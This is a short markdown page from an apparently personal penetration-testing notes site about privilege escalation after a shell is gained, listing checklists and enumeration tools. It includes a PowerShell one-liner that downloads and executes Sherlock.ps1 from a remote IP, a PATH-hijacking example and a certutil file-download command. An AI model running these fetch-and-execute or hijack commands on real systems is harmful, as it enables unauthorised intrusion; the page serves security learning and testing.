---
### The title for the content.
title: "priv esc"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "priv esc"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description: "Get the escalator."
### The datetime assigned to this page.
date: 2020-03-10T16:43:46+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "priv-esc"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight: 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## priv esc

Just because you pop'ed a shell doenst mean its game over. Sometimes you find your self in a low privilage process and in order to compromise the host fully you would need to escalate your privileges

| Checklists                                                                                                                                                   |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [g0tmi1k Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)                                                     |
| [hacktricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)                                         |
| [fuzzysecurity Windows Privilege Escalation ](https://www.fuzzysecurity.com/tutorials/16.html)                                                               |
| [PowerSploit - PowerUp](https://github.com/PowerShellMafia/PowerSploit)                                                                                      |
| [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) |

| Scripts                                                                                                  |                                                                                                                                                                                                                              |
| -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) |
| [linenum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)                        |
| MSF - local_exploit_suggester                                                                            |
| [AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)      |
| [jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)              |
| [RastaMouse/Sherlock](https://github.com/rasta-mouse/Sherlock)                                           | `powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/Sherlock.ps1');$a=find-allvulns;$a | where-object {$_.VulnStatus -notlike 'not *'}| ft Title,VulnStatus,MSBulletin,CVEID,Link -autosize"` |

## Path vulnerability

If something searches the Path for a a command and where able to replace the path we can trick the system to execute something else.  
Whenever we use `ls` it will now actually run `cat`.

```bash
export PATH="/tmp/tmp:${PATH}"
cp /bin/cat /tmp/tmp/cat
mv /tmp/tmp/cat /tmp/tmp/ls
```

## GTFO/LOLBins

[GTFOBins](https://gtfobins.github.io/)

### Download files in command prompt

```
certutil.exe -urlcache -split -f "https://url/file" file
```
